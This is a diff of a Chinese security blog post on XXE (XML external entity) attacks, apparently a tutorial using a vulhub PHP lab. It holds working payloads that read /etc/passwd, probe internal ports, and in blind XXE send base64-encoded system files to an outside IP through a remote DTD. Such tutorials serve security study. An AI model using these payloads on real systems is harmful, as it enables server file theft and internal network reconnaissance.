@@ -1,104 +1,20 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content="XXE 漏洞是针对使用 XML 交互的 Web 应用程序的攻击方法"/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>XXE 漏洞 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>XXE 漏洞</h1>
-      
-<div class="post-meta">
-    <time>2017-12-09</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/xml">xml</a>)
-</div>
-
-      <div><h3 id="0x00-xxe">0x00 XXE</h3>
-<p>XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛</p>
-<p>外部引用时可能会出现XXE漏洞，XXE漏洞是针对使用XML交互的Web应用程序的攻击方法</p>
-<h3 id="0x01-示例代码">0x01 示例代码</h3>
-<p>实验环境：<a href="https://github.com/vulhub/vulhub/tree/master/php/php_xxe?_blank">https://github.com/vulhub/vulhub/tree/master/php/php_xxe</a><br>
-simplexml_load_string.php</p>
-<pre tabindex="0"><code>&lt;?php
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="XXE 漏洞是针对使用 XML 交互的 Web 应用程序的攻击方法"><meta name=author content="Reber"><title>XXE 漏洞 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>XXE 漏洞</h1><div class=post-meta><time>2017-12-09</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/xml>xml</a>)</div><div><h3 id=0x00-xxe>0x00 XXE</h3><p>XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛</p><p>外部引用时可能会出现XXE漏洞，XXE漏洞是针对使用XML交互的Web应用程序的攻击方法</p><h3 id=0x01-示例代码>0x01 示例代码</h3><p>实验环境：<a href=https://github.com/vulhub/vulhub/tree/master/php/php_xxe?_blank>https://github.com/vulhub/vulhub/tree/master/php/php_xxe</a><br>simplexml_load_string.php</p><pre tabindex=0><code>&lt;?php
 $data = file_get_contents(&#39;php://input&#39;);
 $xml = simplexml_load_string($data);
 echo $xml-&gt;name;
-</code></pre><h3 id="0x02-判断是否有xxe漏洞">0x02 判断是否有xxe漏洞</h3>
-<p><img src="/img/post/20180906-110942.png" alt="95"></p>
-<h3 id="0x03-读取文件">0x03 读取文件</h3>
-<ul>
-<li>外部引用读取passwd</li>
-</ul>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
+</code></pre><h3 id=0x02-判断是否有xxe漏洞>0x02 判断是否有xxe漏洞</h3><p><img src=/img/post/20180906-110942.png alt=95></p><h3 id=0x03-读取文件>0x03 读取文件</h3><ul><li>外部引用读取passwd</li></ul><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
 &lt;!DOCTYPE xxe [
   &lt;!ELEMENT name ANY &gt;
   &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;
@@ -106,7 +22,7 @@ echo $xml-&gt;name;
 &lt;root&gt;
   &lt;name&gt;&amp;xxe;&lt;/name&gt;
 &lt;/root&gt;
-</code></pre><pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
+</code></pre><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
 &lt;!DOCTYPE xxe [
   &lt;!ELEMENT name ANY &gt;
   &lt;!ENTITY xxe SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/etc/passwd&#34;&gt;
@@ -114,11 +30,7 @@ echo $xml-&gt;name;
 &lt;root&gt;
   &lt;name&gt;&amp;xxe;&lt;/name&gt;
 &lt;/root&gt;
-</code></pre><ul>
-<li>外部引用dtd文件读取passwd</li>
-</ul>
-<p>evil.dtd中的内容为：<code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
+</code></pre><ul><li>外部引用dtd文件读取passwd</li></ul><p>evil.dtd中的内容为：<code>&lt;!ENTITY b SYSTEM "file:///etc/passwd"></code></p><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
 &lt;!DOCTYPE xxe [
   &lt;!ELEMENT name ANY &gt;
   &lt;!ENTITY % xxe SYSTEM &#34;http://114.115.183.86/evil.dtd&#34;&gt;
@@ -127,75 +39,37 @@ echo $xml-&gt;name;
 &lt;root&gt;
   &lt;name&gt;&amp;b;&lt;/name&gt;
 &lt;/root&gt;
-</code></pre><h3 id="0x04-端口探测">0x04 端口探测</h3>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+</code></pre><h3 id=0x04-端口探测>0x04 端口探测</h3><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
 &lt;!DOCTYPE xxe [
   &lt;!ENTITY http SYSTEM &#39;http://10.11.11.20:3306/&#39;&gt;
 ]&gt;
 &lt;root&gt;
   &lt;name&gt;&amp;http;&lt;/name&gt;
 &lt;/root&gt;
-</code></pre><h3 id="0x05-blind-xxe">0x05 Blind-XXE</h3>
-<ul>
-<li>方法一：</li>
-</ul>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
+</code></pre><h3 id=0x05-blind-xxe>0x05 Blind-XXE</h3><ul><li>方法一：</li></ul><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
 &lt;!DOCTYPE xxe [
     &lt;!ENTITY % remote SYSTEM &#34;http://114.115.183.86/wyb/evil.dtd&#34;&gt;
     %remote;
 ]&gt;
-</code></pre><p>evil.dtd内容：</p>
-<pre tabindex="0"><code>&lt;!ENTITY % file SYSTEM &#34;php://filter/convert.base64-encode/resource=/etc/issue&#34;&gt;
+</code></pre><p>evil.dtd内容：</p><pre tabindex=0><code>&lt;!ENTITY % file SYSTEM &#34;php://filter/convert.base64-encode/resource=/etc/issue&#34;&gt;
 &lt;!ENTITY % all &#34;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://114.115.183.86/?%file;&#39;&gt;&#34;&gt;
 %all;
 %send;
-</code></pre><ul>
-<li>方法二：</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE xxe [
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    &lt;!ENTITY % file SYSTEM &#34;php://filter/convert.base64-encode/resource=/etc/hosts&#34;&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!ENTITY % remote SYSTEM &#34;http://114.115.183.86/wyb/evil.xml&#34;&gt;</span>
-</span></span><span style="display:flex;"><span>    %remote;   <span style="color:#75715e">&lt;!--引用remote来将外部文件evil.xml引入到解释上下文中--&gt;</span>
-</span></span><span style="display:flex;"><span>    %xxe;   <span style="color:#75715e">&lt;!--执行%xxe，这时会检测到send实体，然后在root节点中引用send，就可以成功实现数据转发--&gt;</span>
-</span></span><span style="display:flex;"><span>]&gt;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;</span>&amp;send;<span style="color:#f92672">&lt;/root&gt;</span>
-</span></span></code></pre></div><p>evil.xml内容：</p>
-<pre tabindex="0"><code>&lt;!ENTITY % xxe &#34;&lt;!ENTITY send SYSTEM &#39;http://114.115.183.86/a.php?content=%file;&#39;&gt;&#34;&gt;
-</code></pre><h4 id="reference侵删">Reference(侵删)：</h4>
-<ul>
-<li><a href="http://blog.csdn.net/u011721501/article/details/43775691?_blank">http://blog.csdn.net/u011721501/article/details/43775691</a></li>
-<li><a href="https://security.tencent.com/index.php/blog/msg/69?_blank">https://security.tencent.com/index.php/blog/msg/69</a></li>
-</ul>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre><ul><li>方法二：</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE xxe [
+</span></span></span><span style=display:flex><span><span style=color:#75715e>    &lt;!ENTITY % file SYSTEM &#34;php://filter/convert.base64-encode/resource=/etc/hosts&#34;&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>&lt;!ENTITY % remote SYSTEM &#34;http://114.115.183.86/wyb/evil.xml&#34;&gt;</span>
+</span></span><span style=display:flex><span>    %remote;   <span style=color:#75715e>&lt;!--引用remote来将外部文件evil.xml引入到解释上下文中--&gt;</span>
+</span></span><span style=display:flex><span>    %xxe;   <span style=color:#75715e>&lt;!--执行%xxe，这时会检测到send实体，然后在root节点中引用send，就可以成功实现数据转发--&gt;</span>
+</span></span><span style=display:flex><span>]&gt;
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;root&gt;</span>&amp;send;<span style=color:#f92672>&lt;/root&gt;</span>
+</span></span></code></pre></div><p>evil.xml内容：</p><pre tabindex=0><code>&lt;!ENTITY % xxe &#34;&lt;!ENTITY send SYSTEM &#39;http://114.115.183.86/a.php?content=%file;&#39;&gt;&#34;&gt;
+</code></pre><h4 id=reference侵删>Reference(侵删)：</h4><ul><li><a href=http://blog.csdn.net/u011721501/article/details/43775691?_blank>http://blog.csdn.net/u011721501/article/details/43775691</a></li><li><a href=https://security.tencent.com/index.php/blog/msg/69?_blank>https://security.tencent.com/index.php/blog/msg/69</a></li></ul></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
